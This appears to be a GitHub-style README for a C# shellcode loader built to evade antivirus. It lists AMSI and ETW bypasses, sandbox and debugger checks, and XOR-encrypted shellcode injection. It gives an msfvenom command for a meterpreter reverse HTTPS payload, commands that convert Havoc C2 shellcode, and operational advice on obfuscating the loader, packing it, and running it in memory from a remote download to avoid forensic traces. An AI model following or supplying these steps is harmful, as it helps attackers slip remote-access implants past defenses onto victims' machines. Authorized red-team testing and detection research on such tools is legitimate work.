### C# ShellCode Loader 2
--------------------------------------
Shellcode loader (written in C#) that implements several antivirus bypass and defense evasion techniques.

#### FEATURES
  - Implements shellcode injection using the function 'CreateThreadpoolWait'
  - Shellcode encryption (XOR)
  - ETW bypass
  - AMSI bypass
  - Basic sandbox detection/evasion techniques
    - Exit if the program is running on a computer that is not joined to a domain
    - Exit if after sleeping for 15s, time did not really passed
    - Exit if a debugger is attached
    - Exit if making an uncommon API call fails (i.e. we are running in an AV sandbox that can't emulating it)
  - Compatible with shellcodes of multiple C2 frameworks such as Metasploit and Havoc
    
#### INPUT (Shellcode formats)
Your shellcode must be in C# format (see examples below) and then encrypted using XOR cipher algorithm.
Obviously, both the encrypted shellcode and your XOR key must be added in the file 'CsharpShellCodeLoader.cs' before you compile it.

- Metasploit C2 Framework  
  ```msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread HandlerSSLCert=/path/cert.pem LHOST=IP LPORT=port -a x64 -f csharp -o  shellcode```  
  
- Havoc C2 Framework  
    1. Generate a new HAVOC payload with the format "Windows Shellcode" (Arch: x64 / Indirect Syscall: Enabled / Sleep Technique: WaitForSIngleObjectEx)  
    2. To convert the Havoc shellcode to the appropriate format you need to run these commands:  
       ```@Kali:/$ xxd -p shellcode | tr -d '\n' | sed 's/.\{2\}/0x&,/g' > shellcode2```  
       ```@Kali:/$ sed '$ s/.$//' shellcode2 > shellcode3```  

#### COMPILATION 
- I used "Developer PowerShell for VS 2022":
  - Microsoft (R) Visual C# Compiler version 4.5.0-6.23123.11
  - Command: csc /t:exe /out:C:\path\Loader.exe C:\path\CsharpShellCodeLoader2.cs

#### OPSEC Advices
- The file 'CsharpShellCodeLoader.cs' is not obfuscated. You should manually obfuscate it:
  - Rename the namespace, classes, methods, and variables.
  - Remove all existing comments and insert fake ones.
  - Remove all console output messages (i.e., Console.WriteLine("text")).
  - Modify the code structure or logic slightly if needed to evade signature-based detection.
- You may compress and obfuscate the shellcode loader executable using a packer such as ConfuserEx. However, this step is not strictly necessary to bypass most AV solutions if you performed sufficient manual obfuscation.
- Alternatively, you may choose to remotely download and execute the C# binary in memory using PowerShell and reflection-based code loading. This approach avoids writing the binary to disk, enhancing stealth and reducing forensic traces.
  
#### LICENSE
  - GNU General Public License v3.0
